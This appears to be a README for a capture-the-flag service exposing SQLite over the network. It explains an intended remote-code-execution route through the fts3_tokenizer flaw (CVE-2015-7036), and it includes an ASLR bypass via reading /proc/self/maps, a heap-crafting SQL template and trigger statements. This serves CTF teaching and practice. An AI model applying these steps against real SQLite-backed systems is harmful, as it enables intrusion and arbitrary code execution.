# SQL Demo

The service provides network access to the SQLite in-memory database. Users can execute arbitrary SQL query and read arbitrary file via `.read <filename>`.
The checker puts every flag in new database with random name. Teams should get database names to steal flags.

The service is written on Python and forwards SQL queries to the latest non-modified SQLite library (v3.30.0-1). The primary way to hack the service is to get an RCE via SQL query.

# Vulnerability

The key thing to hack the service is to exploit known but still unfixed (for several years) vulnerability in SQLite ([CVE-2015-7036](https://nvd.nist.gov/vuln/detail/CVE-2015-7036)).

The intendent way to hack the service is to define specific `sqlite3_tokenizer_module` struct:
```
struct sqlite3_tokenizer_module {
  /*
  ** Structure version. Should always be set to 0.
  */
  int iVersion;
  /*
  ** Create a new tokenizer. The values in the argv[] array are the
  ** arguments passed to the "tokenizer" clause of the CREATE VIRTUAL
  ** TABLE statement that created the fts3 table. For example, if
  ** the following SQL is executed:
  **
  **   CREATE .. USING fts3( ... , tokenizer <tokenizer-name> arg1 arg2)
  **
  ** then argc is set to 2, and the argv[] array contains pointers
  ** to the strings "arg1" and "arg2".
  **
  ** This method should return either SQLITE_OK (0), or an SQLite error 
  ** code. If SQLITE_OK is returned, then *ppTokenizer should be set
  ** to point at the newly created tokenizer structure. The generic
  ** sqlite3_tokenizer.pModule variable should not be initialised by
  ** this callback. The caller will do so.
  */
  int (*xCreate)(
    int argc,                           /* Size of argv array */
    const char *const*argv,             /* Tokenizer argument strings */
    sqlite3_tokenizer **ppTokenizer     /* OUT: Created tokenizer */
  );
  /*
  ** Destroy an existing tokenizer. The fts3 module calls this method
  ** exactly once for each successful call to xCreate().
  */
  int (*xDestroy)(sqlite3_tokenizer *pTokenizer);
  /*
  ** Create a tokenizer cursor to tokenize an input buffer. The caller
  ** is responsible for ensuring that the input buffer remains valid
  ** until the cursor is closed (using the xClose() method). 
  */
  int (*xOpen)(
    sqlite3_tokenizer *pTokenizer,       /* Tokenizer object */
    const char *pInput, int nBytes,      /* Input buffer */
    sqlite3_tokenizer_cursor **ppCursor  /* OUT: Created tokenizer cursor */
  );
  /*
  ** Destroy an existing tokenizer cursor. The fts3 module calls this 
  ** method exactly once for each successful call to xOpen().
  */
  int (*xClose)(sqlite3_tokenizer_cursor *pCursor);
  /*
  ** Retrieve the next token from the tokenizer cursor pCursor. This
  ** method should either return SQLITE_OK and set the values of the
  ** "OUT" variables identified below, or SQLITE_DONE to indicate that
  ** the end of the buffer has been reached, or an SQLite error code.
  **
  ** *ppToken should be set to point at a buffer containing the 
  ** normalized version of the token (i.e. after any case-folding and/or
  ** stemming has been performed). *pnBytes should be set to the length
  ** of this buffer in bytes. The input text that generated the token is
  ** identified by the byte offsets returned in *piStartOffset and
  ** *piEndOffset. *piStartOffset should be set to the index of the first
  ** byte of the token in the input buffer. *piEndOffset should be set
  ** to the index of the first byte just past the end of the token in
  ** the input buffer.
  **
  ** The buffer *ppToken is set to point at is managed by the tokenizer
  ** implementation. It is only required to be valid until the next call
  ** to xNext() or xClose(). 
  */
  /* TODO(shess) current implementation requires pInput to be
  ** nul-terminated.  This should either be fixed, or pInput/nBytes
  ** should be converted to zInput.
  */
  int (*xNext)(
    sqlite3_tokenizer_cursor *pCursor,   /* Tokenizer cursor */
    const char **ppToken, int *pnBytes,  /* OUT: Normalized text for token */
    int *piStartOffset,  /* OUT: Byte offset of token in input buffer */
    int *piEndOffset,    /* OUT: Byte offset of end of token in input buffer */
    int *piPosition      /* OUT: Number of tokens returned before this one */
  );
};
```

Teams should craft this struct in the heap memory and pass the pointer to it via `SELECT fts3_tokenizer('main', x'<sqlite3_tokenizer_module address>');` to get an RCE.

To exploit the vulnerability teams should bypass the ASLR. There are several ways to do it:
* via `.read /proc/self/maps` query
* via `.thumbprint` query

Attack scenario:
1. Calculate addresses to bypass an ASLR
2. Craft `sqlite3_tokenizer_module` struct in the heap via
   ```
   SELECT replace(hex(zeroblob(10000)), '00', x'0000000000000000<xCreate function address><xDestroy function address><xOpen function address><xClose function address><xNext function address>');
   ```
3. Define new fts3-tokenizer via `SELECT fts3_tokenizer('main', x'<crafted sqlite3_tokenizer_module address>');`
4. Trigger code execution via overrided `xCreate` (`CREATE VIRTUAL TABLE t USING fts3(tokenize=<tokenizer name>);`) or `xDestroy` (`DROP TABLE t;`)

The exploit can be found at [/sploits/sql_demo/sql_demo.sploit.py](../../sploits/sql_demo/sql_demo.sploit.py).
